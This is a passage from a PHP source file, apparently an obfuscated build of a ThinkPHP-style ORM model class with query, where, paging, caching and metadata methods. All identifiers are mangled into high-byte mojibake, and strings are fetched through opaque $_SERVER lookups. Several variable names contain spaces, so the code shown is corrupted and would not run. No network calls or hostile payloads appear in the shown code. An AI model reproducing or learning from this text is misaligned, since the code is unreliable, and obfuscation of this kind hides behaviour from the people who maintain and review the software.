$Û™Ñğ¿[$‰¸‹Ü£ú]; } array_unshift($¾¥ïÀá, $ÁÜ·õöÚ); } else { array_unshift($¾¥ïÀá, $Û™Ñğ¿[$©Í’ «ö[0]]); } if ($µÖô¡¤[397] == $©Í’ «ö[4]) { return call_user_func_array($©Í’ «ö[1], $¾¥ïÀá); } else { return call_user_func_array(array(&$this, $©Í’ «ö[1]), $¾¥ïÀá); } case $µÖô¡¤[405]: return $Û™Ñğ¿[$©Í’ «ö[0]] == $Û™Ñğ¿[$©Í’ «ö[1]]; case $µÖô¡¤[406]: if (is_string($©Í’ «ö[0]) && strpos($©Í’ «ö[0], $µÖô¡¤[50])) { $©Í’ «ö[0] = explode($µÖô¡¤[50], $©Í’ «ö[0]); } $„ä›Ğ¤ñ = array(); if (is_array($©Í’ «ö[0])) { foreach ($©Í’ «ö[0] as $‰¸‹Ü£ú) { $„ä›Ğ¤ñ[$‰¸‹Ü£ú] = $Û™Ñğ¿[$‰¸‹Ü£ú]; } } else { $„ä›Ğ¤ñ[$©Í’ «ö[0]] = $Û™Ñğ¿[$©Í’ «ö[0]]; } if (!empty($Û™Ñğ¿[$this->getPk()])) { $„ä›Ğ¤ñ[$this->getPk()] = array($µÖô¡¤[407], $Û™Ñğ¿[$this->getPk()]); } if ($this->where($„ä›Ğ¤ñ)->find()) { return !1; } return !0; default: return $this->check($Û™Ñğ¿[$©Í’ «ö[0]], $©Í’ «ö[1], $©Í’ «ö[4]); } } public function check($ÒÅ› ‚, $«¹Ş€è¢, $ÑªÈ‘» = "\x72\145\x67\145\170") { $Ş™èåÖŞ =& $_SERVER[ìïæ“œî]; $ÑªÈ‘» = strtolower(trim($ÑªÈ‘»)); switch ($ÑªÈ‘») { case $Ş™èåÖŞ[7]: case $Ş™èåÖŞ[408]: $ÏÆ¹ı§Ì = is_array($«¹Ş€è¢) ? $«¹Ş€è¢ : explode($Ş™èåÖŞ[50], $«¹Ş€è¢); return $ÑªÈ‘» == $Ş™èåÖŞ[7] ? in_array($ÒÅ› ‚, $ÏÆ¹ı§Ì) : !in_array($ÒÅ› ‚, $ÏÆ¹ı§Ì); case $Ş™èåÖŞ[409]: case $Ş™èåÖŞ[410]: if (is_array($«¹Ş€è¢)) { $˜Ô»æº = $«¹Ş€è¢[0]; $·Õ® = $«¹Ş€è¢[1]; } else { list($˜Ô»æº, $·Õ®) = explode($Ş™èåÖŞ[50], $«¹Ş€è¢); } return $ÑªÈ‘» == $Ş™èåÖŞ[409] ? $ÒÅ› ‚ >= $˜Ô»æº && $ÒÅ› ‚ <= $·Õ® : $ÒÅ› ‚ < $˜Ô»æº || $ÒÅ› ‚ > $·Õ®; case $Ş™èåÖŞ[411]: case $Ş™èåÖŞ[412]: return $ÑªÈ‘» == $Ş™èåÖŞ[411] ? $ÒÅ› ‚ == $«¹Ş€è¢ : $ÒÅ› ‚ != $«¹Ş€è¢; case $Ş™èåÖŞ[413]: $Ş¾ÆÇ  = mb_strlen($ÒÅ› ‚, $Ş™èåÖŞ[414]); if (strpos($«¹Ş€è¢, $Ş™èåÖŞ[50])) { list($˜Ô»æº, $·Õ®) = explode($Ş™èåÖŞ[50], $«¹Ş€è¢); return $Ş¾ÆÇ  >= $˜Ô»æº && $Ş¾ÆÇ  <= $·Õ®; } else { return $Ş¾ÆÇ  == $«¹Ş€è¢; } case $Ş™èåÖŞ[415]: list($†Ê–Ìò, $Æì‘…¨²) = explode($Ş™èåÖŞ[50], $«¹Ş€è¢); if (!is_numeric($†Ê–Ìò)) { $†Ê–Ìò = strtotime($†Ê–Ìò); } if (!is_numeric($Æì‘…¨²)) { $Æì‘…¨² = strtotime($Æì‘…¨²); } return NOW_TIME >= $†Ê–Ìò && NOW_TIME <= $Æì‘…¨²; case $Ş™èåÖŞ[416]: return in_array(get_client_ip(), explode($Ş™èåÖŞ[50], $«¹Ş€è¢)); case $Ş™èåÖŞ[417]: return !in_array(get_client_ip(), explode($Ş™èåÖŞ[50], $«¹Ş€è¢)); case $Ş™èåÖŞ[404]: default: return $this->regex($ÒÅ› ‚, $«¹Ş€è¢); } } public function query($èïª§ü, $»ãñöÂÍ = false) { $ÚòÒÖ« =& $_SERVER[ìïæ“œî]; if (!is_bool($»ãñöÂÍ) && !is_array($»ãñöÂÍ)) { $»ãñöÂÍ = func_get_args(); array_shift($»ãñöÂÍ); } $èïª§ü = str_replace(array($ÚòÒÖ«[262], $ÚòÒÖ«[418]), $ÚòÒÖ«[53], $èïª§ü); $èïª§ü = $this->parseSql($èïª§ü, $»ãñöÂÍ); return $this->db->query($èïª§ü); } public function execute($Çİõùí, $×ì½÷› = false) { if (!is_bool($×ì½÷›) && !is_array($×ì½÷›)) { $×ì½÷› = func_get_args(); array_shift($×ì½÷›); } $Çİõùí = $this->parseSql($Çİõùí, $×ì½÷›); return $this->db->execute($Çİõùí); } protected function parseSql($Áò¤°£Æ, $³çø¨ÇÖ) { $€ô½”Æâ =& $_SERVER[ìïæ“œî]; if (!0 === $³çø¨ÇÖ) { $Íşí˜¥¸ = $this->_parseOptions(); $Áò¤°£Æ = $this->db->parseSql($Áò¤°£Æ, $Íşí˜¥¸); } elseif (is_array($³çø¨ÇÖ)) { $³çø¨ÇÖ = array_map(array($this->db, $€ô½”Æâ[419]), $³çø¨ÇÖ); $Áò¤°£Æ = vsprintf($Áò¤°£Æ, $³çø¨ÇÖ); } else { $Áò¤°£Æ = strtr($Áò¤°£Æ, array($€ô½”Æâ[420] => $this->getTableName(), $€ô½”Æâ[421] => think_config($€ô½”Æâ[321]))); } $this->db->setModel($this->name); return $Áò¤°£Æ; } public function db($àå¹±„² = '', $Äı·íúë = '', $»²Á«Ã = array()) { $¹â¶óƒş =& $_SERVER[ìïæ“œî]; if ($¹â¶óƒş[12] === $àå¹±„² && $this->db) { return $this->db; } static $×Øì’ï = array(); static $Êë–æ´ = array(); if (!isset($Êë–æ´[$àå¹±„²]) || isset($Êë–æ´[$àå¹±„²]) && $Äı·íúë && $×Øì’ï[$àå¹±„²] != $Äı·íúë) { if (!empty($Äı·íúë) && is_string($Äı·íúë) && !1 === strpos($Äı·íúë, $¹â¶óƒş[8])) { $Äı·íúë = think_config($Äı·íúë); } $àå¹±„² = think_guid($Äı·íúë); $Êë–æ´[$àå¹±„²] = Db::getInstance($Äı·íúë); } elseif (NULL === $Äı·íúë) { $Êë–æ´[$àå¹±„²]->close(); unset($Êë–æ´[$àå¹±„²]); return; } if (!empty($»²Á«Ã)) { if (is_string($»²Á«Ã)) { parse_str($»²Á«Ã, $»²Á«Ã); } foreach ($»²Á«Ã as $®’ĞÖ«ì => $¼‘«ã¸ı) { $this->setProperty($®’ĞÖ«ì, $¼‘«ã¸ı); } } $×Øì’ï[$àå¹±„²] = $Äı·íúë; $this->db = $Êë–æ´[$àå¹±„²]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Æ¾é»¸€ = get_class($this); if ($Æ¾é»¸€ == $_SERVER[ìïæ“œî][422]) { return $this->name; } $this->name = substr($Æ¾é»¸€, 0, -5); } return $this->name; } public function getTableName() { $è‚¥ ™Œ =& $_SERVER[ìïæ“œî]; if (empty($this->trueTableName)) { $‚Àµè×© = !empty($this->tablePrefix) ? $this->tablePrefix : $è‚¥ ™Œ[12]; if (!empty($this->tableName)) { $‚Àµè×© .= $this->tableName; } else { $‚Àµè×© .= think_parse_name($this->name); } $this->trueTableName = strtolower($‚Àµè×©); } return (!empty($this->dbName) ? $this->dbName . $è‚¥ ™Œ[10] : $è‚¥ ™Œ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $¡ØÅ§£› =& $_SERVER[ìïæ“œî]; return isset($this->fields[$¡ØÅ§£›[328]]) ? $this->fields[$¡ØÅ§£›[328]] : $this->pk; } public function getDbFields() { $„ˆ¸³öô =& $_SERVER[ìïæ“œî]; if (isset($this->options[$„ˆ¸³öô[356]])) { $á±ò´ñ = $this->db->getFields($this->options[$„ˆ¸³öô[356]]); return $á±ò´ñ ? array_keys($á±ò´ñ) : !1; } if ($this->fields) { $á±ò´ñ = $this->fields; unset($á±ò´ñ[$„ˆ¸³öô[327]], $á±ò´ñ[$„ˆ¸³öô[328]], $á±ò´ñ[$„ˆ¸³öô[329]], $á±ò´ñ[$„ˆ¸³öô[326]]); return $á±ò´ñ; } return !1; } public function data($²Ó£÷Ïã = '') { $®å‚ÈÀš =& $_SERVER[ìïæ“œî]; if ($®å‚ÈÀš[12] === $²Ó£÷Ïã && !empty($this->data)) { return $this->data; } if (is_object($²Ó£÷Ïã)) { $²Ó£÷Ïã = get_object_vars($²Ó£÷Ïã); } elseif (is_string($²Ó£÷Ïã)) { parse_str($²Ó£÷Ïã, $²Ó£÷Ïã); } elseif (!is_array($²Ó£÷Ïã)) { think_exception(think_lang($®å‚ÈÀš[348])); } $this->data = $²Ó£÷Ïã; return $this; } public function join($¬òÚ½ÒÎ) { $¡´ã‚² =& $_SERVER[ìïæ“œî]; if (is_array($¬òÚ½ÒÎ)) { $this->options[$¡´ã‚²[359]] = $¬òÚ½ÒÎ; } elseif (!empty($¬òÚ½ÒÎ)) { $this->options[$¡´ã‚²[359]][] = $¬òÚ½ÒÎ; } return $this; } public function union($ñÚˆÅŸâ, $ªóä§á÷ = false) { $Ïí‘ƒ¢ =& $_SERVER[ìïæ“œî]; if (empty($ñÚˆÅŸâ)) { return $this; } if ($ªóä§á÷) { $this->options[$Ïí‘ƒ¢[423]][$Ïí‘ƒ¢[424]] = !0; } if (is_object($ñÚˆÅŸâ)) { $ñÚˆÅŸâ = get_object_vars($ñÚˆÅŸâ); } if (is_string($ñÚˆÅŸâ)) { $çĞ¦±Šº = $ñÚˆÅŸâ; } elseif (is_array($ñÚˆÅŸâ)) { if (isset($ñÚˆÅŸâ[0])) { $this->options[$Ïí‘ƒ¢[423]] = array_merge($this->options[$Ïí‘ƒ¢[423]], $ñÚˆÅŸâ); return $this; } else { $çĞ¦±Šº = $ñÚˆÅŸâ; } } else { think_exception(think_lang($Ïí‘ƒ¢[348])); } $this->options[$Ïí‘ƒ¢[423]][] = $çĞ¦±Šº; return $this; } public function cache($±®ôù = true, $æœãá‚À = null, $öì¶ÉÎ = '') { $¤Ãïó =& $_SERVER[ìïæ“œî]; if (!1 !== $±®ôù) { $this->options[$¤Ãïó[425]] = array($¤Ãïó[97] => $±®ôù, $¤Ãïó[415] => $æœãá‚À, $¤Ãïó[33] => $öì¶ÉÎ); } return $this; } public function field($”ÍÒíƒğ, $­Ù÷Ïåü = false) { $›Ïçˆ‘ =& $_SERVER[ìïæ“œî]; if (!0 === $”ÍÒíƒğ) { $’‚éÆÒ¼ = $this->getDbFields(); $”ÍÒíƒğ = $’‚éÆÒ¼ ? $’‚éÆÒ¼ : $›Ïçˆ‘[220]; } elseif ($­Ù÷Ïåü) { if (is_string($”ÍÒíƒğ)) { $”ÍÒíƒğ = explode($›Ïçˆ‘[50], $”ÍÒíƒğ); } $’‚éÆÒ¼ = $this->getDbFields(); $”ÍÒíƒğ = $’‚éÆÒ¼ ? array_diff($’‚éÆÒ¼, $”ÍÒíƒğ) : $”ÍÒíƒğ; } $this->options[$›Ïçˆ‘[350]] = $”ÍÒíƒğ; return $this; } public function scope($ÑüâÀé = '', $éàøÛß© = NULL) { $ìßÜŸ»¡ =& $_SERVER[ìïæ“œî]; if ($ìßÜŸ»¡[12] === $ÑüâÀé) { if (isset($this->_scope[$ìßÜŸ»¡[37]])) { $˜ ¶‚’ = $this->_scope[$ìßÜŸ»¡[37]]; } else { return $this; } } elseif (is_string($ÑüâÀé)) { $Úìªšßß = explode($ìßÜŸ»¡[50], $ÑüâÀé); $˜ ¶‚’ = array(); foreach ($Úìªšßß as $‚¶ã’Á‹) { if (!isset($this->_scope[$‚¶ã’Á‹])) { continue; } $˜ ¶‚’ = array_merge($˜ ¶‚’, $this->_scope[$‚¶ã’Á‹]); } if (!empty($éàøÛß©) && is_array($éàøÛß©)) { $˜ ¶‚’ = array_merge($˜ ¶‚’, $éàøÛß©); } } elseif (is_array($ÑüâÀé)) { $˜ ¶‚’ = $ÑüâÀé; } if (is_array($˜ ¶‚’) && !empty($˜ ¶‚’)) { $this->options = array_merge($this->options, array_change_key_case($˜ ¶‚’)); } return $this; } public function where($£•’Å§¿, $¡¤Ÿ–î« = null) { $Œƒûøåş =& $_SERVER[ìïæ“œî]; if (!is_null($¡¤Ÿ–î«) && is_string($£•’Å§¿)) { if (!is_array($¡¤Ÿ–î«)) { $¡¤Ÿ–î« = func_get_args(); array_shift($¡¤Ÿ–î«); } $¡¤Ÿ–î« = array_map(array($this->db, $Œƒûøåş[419]), $¡¤Ÿ–î«); $£•’Å§¿ = vsprintf($£•’Å§¿, $¡¤Ÿ–î«); } elseif (is_object($£•’Å§¿)) { $£•’Å§¿ = get_object_vars($£•’Å§¿); } elseif (is_array($£•’Å§¿)) { foreach ($£•’Å§¿ as $€¹ïòè¼ => $ıĞ¤ÑŞ) { if ((is_numeric($€¹ïòè¼) || !$€¹ïòè¼) && is_string($ıĞ¤ÑŞ)) { if (strpos($ıĞ¤ÑŞ, $Œƒûøåş[426]) === 0) { continue; } think_trace($Œƒûøåş[427], $Œƒûøåş[12], $Œƒûøåş[49]); die; } } } if (is_string($£•’Å§¿) && $Œƒûøåş[12] != $£•’Å§¿) { $‚Ì¿¶Ã = array(); $‚Ì¿¶Ã[$Œƒûøåş[428]] = $£•’Å§¿; $£•’Å§¿ = $‚Ì¿¶Ã; } if (isset($this->options[$Œƒûøåş[352]])) { $this->options[$Œƒûøåş[352]] = array_merge($this->options[$Œƒûøåş[352]], $£•’Å§¿); } else { $this->options[$Œƒûøåş[352]] = $£•’Å§¿; } return $this; } public function limit($Ì…°© Š, $îàÇ×­‡ = null) { $€Æªõşâ =& $_SERVER[ìïæ“œî]; $this->options[$€Æªõşâ[368]] = is_null($îàÇ×­‡) ? $Ì…°© Š : $Ì…°© Š . $€Æªõşâ[50] . $îàÇ×­‡; return $this; } public function page($’ü¢¶à, $ğ£’‹å¸ = null) { $×ÛÍ‘ó =& $_SERVER[ìïæ“œî]; $this->options[$×ÛÍ‘ó[429]] = is_null($ğ£’‹å¸) ? $’ü¢¶à : $’ü¢¶à . $×ÛÍ‘ó[50] . $ğ£’‹å¸; return $this; } public function comment($ññ‹§‚™) { $this->options[$_SERVER[ìïæ“œî][430]] = $ññ‹§‚™; return $this; } public function setProperty($éûàÃä’, $Ü×Ì»Ÿ†) { if (property_exists($this, $éûàÃä’)) { $this->{$éûàÃä’} = $Ü×Ì»Ÿ†; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\x69\146\x79\124\151\x6d\145", "\x74\151\x6d\145", "\151\x6e\163\x65\162\164\54\x75\160\144\x61\x74\x65", "\146\x75\156\x63\x74\151\x6f\x6e"), array("\143\x72\x65\x61\x74\x65\124\x69\x6d\x65", "\164\x69\155\145", "\x69\x6e\x73\145\x72\x74", "\x66\x75\x6e\143\164\151\x6f\156")); public function setDataAuto($¨¾¸ø) { $this->dataAuto = $¨¾¸ø; } public function __construct($÷Ğ…ÌåÓ = '', $¥ŠÆ…š = '', $ğËÀï¤‹ = '') { parent::__construct($÷Ğ…ÌåÓ, $¥ŠÆ…š, $ğËÀï¤‹); } protected $tableMeta = array(); protected function _beforeInsert(&$ÔÁÃ£´€, $¤ÃÇÛ©) { $á¸¿®Ì£ =& $_SERVER[ìïæ“œî]; if (!$this->checkDataAutoHas($á¸¿®Ì£[431])) { return; } $this->dataBeforeFilter($ÔÁÃ£´€, $á¸¿®Ì£[431]); } protected function _beforeUpdate(&$¹ÃÂîøƒ, $¿Íü¿‰¡) { $¶ŒËª®Î =& $_SERVER[ìïæ“œî]; if (!$this->checkDataAutoHas($¶ŒËª®Î[432])) { return; } $this->dataBeforeFilter($¹ÃÂîøƒ, $¶ŒËª®Î[432]); } protected function _afterSelect(&$Âïø†Õ, $×µÜˆÔÆ) { if (!is_array($Âïø†Õ)) { return; } if (!$this->checkDataAutoHas($_SERVER[ìïæ“œî][433])) { return; } foreach ($Âïø†Õ as &$†¬’ñöû) { $this->dataAfterFilter($†¬’ñöû); } unset($†¬’ñöû); } protected function _afterFind(&$ÖªáÉ, $Ê²àÜÒó) { if (!is_array($ÖªáÉ)) { return; } if (!$this->checkDataAutoHas($_SERVER[ìïæ“œî][433])) { return; } $this->dataAfterFilter($ÖªáÉ); } public static function textEncode($·‚û„Ì·) { if (!$·‚û„Ì·) { return $·‚û„Ì·; } $¸†î›¨ = json_encode($·‚û„Ì·); $¸†î›¨ = preg_replace_callback($_SERVER[ìïæ“œî][434], function ($¡É¢¼ü¦) { return addslashes($¡É¢¼ü¦[0]); }, $¸†î›¨); return json_decode($¸†î›¨); } public static function textDecode($Ÿ¿›°«ä) { $ôƒ¯Ä¾” =& $_SERVER[ìïæ“œî]; $†Ø×©« = json_encode($Ÿ¿›°«ä); $†Ø×©« = preg_replace_callback($ôƒ¯Ä¾”[435], function ($ä÷çÁ´ƒ) { return $_SERVER[ìïæ“œî][100]; }, $†Ø×©«); return json_decode($†Ø×©«); } public function setAutoIncrement($º£áãºÍ) { $¨³ì©Ñå = array($this->getPk() => $º£áãºÍ); $ÏåİŠ²ù = $this->data($¨³ì©Ñå)->add(); if ($ÏåİŠ²ù) { $this->delete($ÏåİŠ²ù); } } public function getAutoIncrement() { $şÕ‘Ãş = $this->getTableName(); $ƒ® ş®À = $this->max($this->getPk()); $ƒ† Ï”Š = $this->query("\x73\150\x6f\x77\40\164\x61\x62\x6c\145\40\163\x74\141\x74\x75\x73\x20\167\150\145\x72\x65\40\116\x61\155\145\75\47{$şÕ‘Ãş}\x27"); $­‘ñÍ æ = $ƒ† Ï”Š[0][$_SERVER[ìïæ“œî][436]]; $ş³ı°éÎ = max($ƒ® ş®À, $­‘ñÍ æ); return $ş³ı°éÎ; } protected function _callBefore($ä´»ŠÖ±, $¶’‹ ¹Ì) { return $this->cacheCallCheck($ä´»ŠÖ±, $¶’‹ ¹Ì, !1); } protected function _callAfter($Ÿùñ¤¯¤, $—Ü¶Áø) { return $this->cacheCallCheck($Ÿùñ¤¯¤, $—Ü¶Áø, !0); } protected function cacheFunctionAlias($¦Õ›—·) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($·Ïİ¦ĞÒ, $‡é­œ¶ó, $ôÁ§ãŞ€ = false) { $èû¶Ãöœ = $this->cacheFunctionAlias($‡é­œ¶ó); if (!$èû¶Ãöœ) { return; } foreach ($èû¶Ãöœ as $Ôˆø¾ÈÌ => $®¸ŒÄ’Ö) { $îíöüé¹ = $®¸ŒÄ’Ö[0]; $İ¤Æ¢¯× = explode($_SERVER[ìïæ“œî][50], $®¸ŒÄ’Ö[1]); if ($·Ïİ¦ĞÒ == $Ôˆø¾ÈÌ) { return $this->cacheFunctionGet($Ôˆø¾ÈÌ, $îíöüé¹); } if ($ôÁ§ãŞ€ && in_array($·Ïİ¦ĞÒ, $İ¤Æ¢¯×)) { $this->cacheFunctionClear($Ôˆø¾ÈÌ, $îíöüé¹); } } } public function cacheFunctionGet($ß™ñá©ü, $Ã„Ó±‡) { $ó‚ÜÜÛ = $this->cacheKeyMake($ß™ñá©ü, $Ã„Ó±‡); $’ö¤Ê¯Ş = Cache::get($ó‚ÜÜÛ); if (!is_array($’ö¤Ê¯Ş)) { $’ö¤Ê¯Ş = call_user_func_array(array($this, $ß™ñá©ü), array($Ã„Ó±‡, !0)); Cache::set($ó‚ÜÜÛ, $’ö¤Ê¯Ş); } return $’ö¤Ê¯Ş; } public function cacheFunctionClear($Ù„Â‘ñ¦, $ıùÓ•ü÷) { $Ì…Áİö = $ıùÓ•ü÷; if (!is_array($ıùÓ•ü÷)) { $Ì…Áİö = array($ıùÓ•ü÷); } foreach ($Ì…Áİö as $£¦Â‘µé) { $ğÃŒ©Úê = $this->cacheKeyMake($Ù„Â‘ñ¦, $£¦Â‘µé); Cache::remove($ğÃŒ©Úê); } } private function cacheKeyMake($££‘©‰ù, $µ‡ÁğôÀ) { $—®ëçø‡ =& $_SERVER[ìïæ“œî]; return get_class($this) . $—®ëçø‡[11] . $££‘©‰ù . $—®ëçø‡[437] . $µ‡ÁğôÀ; } protected function selectPageReset() { $á¹ÎŞäª =& $_SERVER[ìïæ“œî]; if (isset($GLOBALS[$á¹ÎŞäª[438]])) { return; } $GLOBALS[$á¹ÎŞäª[438]] = isset($GLOBALS[$á¹ÎŞäª[7]][$á¹ÎŞäª[439]]) ? $GLOBALS[$á¹ÎŞäª[7]][$á¹ÎŞäª[439]] : !1; $GLOBALS[$á¹ÎŞäª[440]] = isset($GLOBALS[$á¹ÎŞäª[7]][$á¹ÎŞäª[429]]) ? $GLOBALS[$á¹ÎŞäª[7]][$á¹ÎŞäª[429]] : !1; $GLOBALS[$á¹ÎŞäª[7]][$á¹ÎŞäª[439]] = !1; $GLOBALS[$á¹ÎŞäª[7]][$á¹ÎŞäª[429]] = !1; } protected function selectPageRestore() { $‚áÒíİÜ =& $_SERVER[ìïæ“œî]; if (!isset($GLOBALS[$‚áÒíİÜ[438]])) { return; } $GLOBALS[$‚áÒíİÜ[7]][$‚áÒíİÜ[439]] = $GLOBALS[$‚áÒíİÜ[438]]; $GLOBALS[$‚áÒíİÜ[7]][$‚áÒíİÜ[429]] = $GLOBALS[$‚áÒíİÜ[440]]; if ($GLOBALS[$‚áÒíİÜ[7]][$‚áÒíİÜ[439]] === !1) { unset($GLOBALS[$‚áÒíİÜ[7]][$‚áÒíİÜ[439]]); } if ($GLOBALS[$‚áÒíİÜ[7]][$‚áÒíİÜ[429]] === !1) { unset($GLOBALS[$‚áÒíİÜ[7]][$‚áÒíİÜ[429]]); } unset($GLOBALS[$‚áÒíİÜ[438]]); unset($GLOBALS[$‚áÒíİÜ[440]]); } protected function selectPage($ğ¹ùÈ = 200, $Ÿ”¸Ö«‘ = 1) { $¦ÂçøÍş =& $_SERVER[ìïæ“œî]; global $in; $Òªõ‹°õ = $this->optionsValue(); $›¢¥ö’´ = 50000; $ğ¹ùÈ = isset($in[$¦ÂçøÍş[439]]) && $in[$¦ÂçøÍş[439]] ? $in[$¦ÂçøÍş[439]] : $ğ¹ùÈ; if ($ğ¹ùÈ === -1) { $in[$¦ÂçøÍş[439]] = !1; $›¢¥ö’´ = 100000000; $ğ¹ùÈ = $›¢¥ö’´; } $¨ŞÀ¸ = $Òªõ‹°õ; $¨ŞÀ¸[$¦ÂçøÍş[441]] = array(); $ğ¹ùÈ = intval($ğ¹ùÈ); $ğ¹ùÈ = $ğ¹ùÈ <= 5 ? 5 : ($ğ¹ùÈ >= $›¢¥ö’´ ? $›¢¥ö’´ : $ğ¹ùÈ); $Ÿ”¸Ö«‘ = intval(isset($in[$¦ÂçøÍş[429]]) && $in[$¦ÂçøÍş[429]] ? $in[$¦ÂçøÍş[429]] : $Ÿ”¸Ö«‘); $Ÿ”¸Ö«‘ = $Ÿ”¸Ö«‘ <= 1 ? 1 : $Ÿ”¸Ö«‘; $ıÈÚæ‚À = array(); $ª¡Ãˆı = 1; if ($Ÿ”¸Ö«‘ == 1 && $ª¡Ãˆı) { $this->optionsValue($Òªõ‹°õ); $ıÈÚæ‚À = $this->page($Ÿ”¸Ö«‘, $ğ¹ùÈ)->select(); $‡ÏÒ‡ = is_array($ıÈÚæ‚À) ? count($ıÈÚæ‚À) : 0; if ($‡ÏÒ‡ < $ğ¹ùÈ) { $ØµÜ…®Ú = 1; } else { $this->optionsValue($¨ŞÀ¸); $‡ÏÒ‡ = intval($this->count()); $ØµÜ…®Ú = ceil($‡ÏÒ‡ / $ğ¹ùÈ); } } else { $this->optionsValue($¨ŞÀ¸); $‡ÏÒ‡ = intval($this->count()); $ØµÜ…®Ú = ceil($‡ÏÒ‡ / $ğ¹ùÈ); $Ÿ”¸Ö«‘ = $Ÿ”¸Ö«‘ >= $ØµÜ…®Ú ? $ØµÜ…®Ú : $Ÿ”¸Ö«‘; $this->optionsValue($Òªõ‹°õ); $ıÈÚæ‚À = $this->page($Ÿ”¸Ö«‘, $ğ¹ùÈ)->select(); } if (!is_array($ıÈÚæ‚À)) { $ıÈÚæ‚À = array(); } if ($ØµÜ…®Ú == 1) { $‡ÏÒ‡ = count($ıÈÚæ‚À); } $¾ûèñĞ¾ = array($¦ÂçøÍş[442] => array($¦ÂçøÍş[443] => $‡ÏÒ‡, $¦ÂçøÍş[439] => $ğ¹ùÈ, $¦ÂçøÍş[429] => $Ÿ”¸Ö«‘, $¦ÂçøÍş[444] => $ØµÜ…®Ú), $¦ÂçøÍş[445] => $ıÈÚæ‚À); return $¾ûèñĞ¾; } protected function checkLength($ú¤ò…Ëı, $â‘ğ¯æ´ = 0, $¸‘îéØ› = '') { $ÍæíÇ‰ì =& $_SERVER[ìïæ“œî]; $â‘ğ¯æ´ = $â‘ğ¯æ´ ? $â‘ğ¯æ´ : 65536; if (!$ú¤ò…Ëı || strlen($ú¤ò…Ëı) < $â‘ğ¯æ´) { return; } $¸‘îéØ› = $¸‘îéØ› ? $¸‘îéØ› . $ÍæíÇ‰ì[74] : $ÍæíÇ‰ì[12]; show_json($¸‘îéØ› . LNG($ÍæíÇ‰ì[446]) . "\x28{$â‘ğ¯æ´}\x29", !1); } protected function metaSet($ïàï°, $÷“Ú§„Æ = null, $°îÌ’¬« = null) { $é¯ë²À =& $_SERVER[ìïæ“œî]; if (!$this->tableMeta || !$ïàï°) { return !1; } $Ñµ¬­ü— = $this->tableMeta[$é¯ë²À[447]]; $ƒíæøŒ = $this->tableMeta[$é¯ë²À[448]]; $à³Ø»î = Model($ƒíæøŒ); $à¤›ß×ƒ = array($Ñµ¬­ü— => $ïàï°, $é¯ë²À[449] => $÷“Ú§„Æ); if (is_null($÷“Ú§„Æ)) { return $à³Ø»î->where(array($Ñµ¬­ü— => $ïàï°))->delete(); } if (is_null($°îÌ’¬«) && is_string($÷“Ú§„Æ)) { return $à³Ø»î->where($à¤›ß×ƒ)->delete(); } $âÃºØèÎ = is_array($÷“Ú§„Æ) ? $÷“Ú§„Æ : array(); if (is_string($÷“Ú§„Æ)) { $âÃºØèÎ[$÷“Ú§„Æ] = $°îÌ’¬«; } $â‡¶Å¸³ = array(); foreach ($âÃºØèÎ as $Ğ•±Ğ´¿ => $ÂûÈÄš§) { if (is_null($ÂûÈÄš§) && is_string($Ğ•±Ğ´¿)) { $à³Ø»î->where(array($Ñµ¬­ü— => $ïàï°, $é¯ë²À[449] => $Ğ•±Ğ´¿))->delete(); continue; } $this->checkLength($ÂûÈÄš§, !1, $ƒíæøŒ . $é¯ë²À[4] . $Ğ•±Ğ´¿); $â‡¶Å¸³[] = array($Ñµ¬­ü— => $ïàï°, $é¯ë²À[97] => $Ğ•±Ğ´¿, $é¯ë²À[450] => $ÂûÈÄš§); } $ó¥ô°Ï» = $é¯ë²À[451] . $ƒíæøŒ; CacheLock::lock($ó¥ô°Ï»); $à³Ø»î->where(array($Ñµ¬­ü— => $ïàï°))->addAll($â‡¶Å¸³, array(), !0); CacheLock::unlock($ó¥ô°Ï»); return !0; } public function metaGet($×“Â²Áú, $‡¨ÒÂÑõ = false) { $îâ†Ö±Ú =& $_SERVER[ìïæ“œî]; if (!$this->tableMeta) { return array(); } $°óöÕÀê = $this->tableMeta[$îâ†Ö±Ú[447]]; $çÉ¶çİ = Model($this->tableMeta[$îâ†Ö±Ú[448]]); if ($‡¨ÒÂÑõ) { $à‰›•­ = array($°óöÕÀê => $×“Â²Áú, $îâ†Ö±Ú[97] => $‡¨ÒÂÑõ); return $çÉ¶çİ->where($à‰›•­)->getField($îâ†Ö±Ú[450]); } $à‰›•­ = array($°óöÕÀê => $×“Â²Áú); $ÆæâŞë· = $çÉ¶çİ->field($îâ†Ö±Ú[452])->where($à‰›•­)->select(); $ÆæâŞë· = array_to_keyvalue($ÆæâŞë·, $îâ†Ö±Ú[97], $îâ†Ö±Ú[450]); return $ÆæâŞë·; } private function checkDataAutoHas($í™•èÌ¤) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $½˜…¤€Ë) { if (in_array($í™•èÌ¤, explode($_SERVER[ìïæ“œî][50], $½˜…¤€Ë[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$Õ¹Ø¢ò¼, $Ÿ©ã¡¨†) { $Àüõøßä =& $_SERVER[ìïæ“œî]; if (!is_array($Õ¹Ø¢ò¼)) { return; } foreach ($this->dataAuto as $±¾ËÛõ¨) { $ÁÕ™ìÚ = $±¾ËÛõ¨[0]; if (!in_array($Ÿ©ã¡¨†, explode($Àüõøßä[50], $±¾ËÛõ¨[2]))) { continue; } switch (trim($±¾ËÛõ¨[3])) { case $Àüõøßä[397]: case $Àüõøßä[398]: $éë¿õĞ = $±¾ËÛõ¨[1]; $Š¾¯¤Í— = isset($±¾ËÛõ¨[4]) ? (array) $±¾ËÛõ¨[4] : array(); if ($éë¿õĞ == $Àüõøßä[206] && array_key_exists($ÁÕ™ìÚ, $Õ¹Ø¢ò¼)) { if (!$Õ¹Ø¢ò¼[$ÁÕ™ìÚ]) { unset($Õ¹Ø¢ò¼[$ÁÕ™ìÚ]); } break; } if (isset($Õ¹Ø¢ò¼[$ÁÕ™ìÚ])) { 